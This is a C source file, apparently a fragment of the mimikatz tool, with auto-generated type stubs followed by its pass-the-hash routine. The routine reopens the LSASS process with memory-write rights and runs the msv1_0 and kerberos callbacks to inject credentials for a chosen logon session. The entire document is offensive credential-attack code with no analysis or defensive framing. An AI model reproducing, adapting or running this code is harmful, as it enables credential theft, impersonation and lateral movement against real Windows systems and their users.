
typedef unsigned long size_t;
typedef long intptr_t; typedef unsigned long uintptr_t;
typedef long scalar_t__;

typedef int bool;




typedef struct TYPE_15__ TYPE_8__ ;
typedef struct TYPE_14__ TYPE_5__ ;
typedef struct TYPE_13__ TYPE_4__ ;
typedef struct TYPE_12__ TYPE_3__ ;
typedef struct TYPE_11__ TYPE_2__ ;
typedef struct TYPE_10__ TYPE_1__ ;


typedef int VOID ;
typedef int ULONG ;
struct TYPE_15__ {TYPE_2__* hLsassMem; } ;
struct TYPE_14__ {int GrantedAccess; } ;
struct TYPE_13__ {TYPE_3__* LogonId; } ;
struct TYPE_12__ {int LowPart; int HighPart; } ;
struct TYPE_11__ {scalar_t__ type; TYPE_1__* pHandleProcess; } ;
struct TYPE_10__ {int hProcess; } ;
typedef TYPE_4__* PSEKURLSA_PTH_DATA ;
typedef TYPE_5__ OBJECT_BASIC_INFORMATION ;
typedef int NTSTATUS ;
typedef int HANDLE ;
typedef int BOOL ;


 int CloseHandle (int ) ;
 int FALSE ;
 int GetProcessId (int ) ;
 scalar_t__ KULL_M_MEMORY_TYPE_PROCESS ;
 scalar_t__ NT_SUCCESS (int ) ;
 int NtQueryObject (int ,int ,TYPE_5__*,int,int *) ;
 int ObjectBasicInformation ;
 int OpenProcess (int,int,int ) ;
 int PRINT_ERROR (char*,...) ;
 int PRINT_ERROR_AUTO (char*) ;
 int PROCESS_VM_OPERATION ;
 int PROCESS_VM_WRITE ;
 int TRUE ;
 TYPE_8__ cLsass ;
 int kprintf (char*,...) ;
 int kuhl_m_sekurlsa_acquireLSA () ;
 int kuhl_m_sekurlsa_enum (int ,TYPE_4__*) ;
 int kuhl_m_sekurlsa_enum_callback_kerberos_pth ;
 int kuhl_m_sekurlsa_enum_callback_msv_pth ;

VOID kuhl_m_sekurlsa_pth_luid(PSEKURLSA_PTH_DATA data)
{
 OBJECT_BASIC_INFORMATION bi;
 ULONG szNeeded;
 HANDLE hTemp;
 NTSTATUS status;
 BOOL isRWok = FALSE;

 if(NT_SUCCESS(kuhl_m_sekurlsa_acquireLSA()) && (cLsass.hLsassMem->type == KULL_M_MEMORY_TYPE_PROCESS))
 {
  kprintf(L"  |  LSA Process ");
  status = NtQueryObject(cLsass.hLsassMem->pHandleProcess->hProcess, ObjectBasicInformation, &bi, sizeof(OBJECT_BASIC_INFORMATION), &szNeeded);
  if(NT_SUCCESS(status))
  {
   if(isRWok = (bi.GrantedAccess & (PROCESS_VM_OPERATION | PROCESS_VM_WRITE)))
    kprintf(L"was already R/W\n");
   else
   {
    if(hTemp = OpenProcess(bi.GrantedAccess | PROCESS_VM_OPERATION | PROCESS_VM_WRITE, FALSE, GetProcessId(cLsass.hLsassMem->pHandleProcess->hProcess)))
    {
     isRWok = TRUE;
     CloseHandle(cLsass.hLsassMem->pHandleProcess->hProcess);
     cLsass.hLsassMem->pHandleProcess->hProcess = hTemp;
     kprintf(L"is now R/W\n");
    }
    else PRINT_ERROR_AUTO(L"OpenProcess");
   }
  }
  else PRINT_ERROR(L"NtQueryObject: %08x\n", status);

  if(isRWok)
  {
   kprintf(L"  |  LUID %u ; %u (%08x:%08x)\n", data->LogonId->HighPart, data->LogonId->LowPart, data->LogonId->HighPart, data->LogonId->LowPart);
   kprintf(L"  \\_ msv1_0   - ");
   kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_msv_pth, data);
   kprintf(L"\n");
   kprintf(L"  \\_ kerberos - ");
   kuhl_m_sekurlsa_enum(kuhl_m_sekurlsa_enum_callback_kerberos_pth, data);
   kprintf(L"\n");
  }
 }
 else PRINT_ERROR(L"memory handle is not KULL_M_MEMORY_TYPE_PROCESS\n");
}
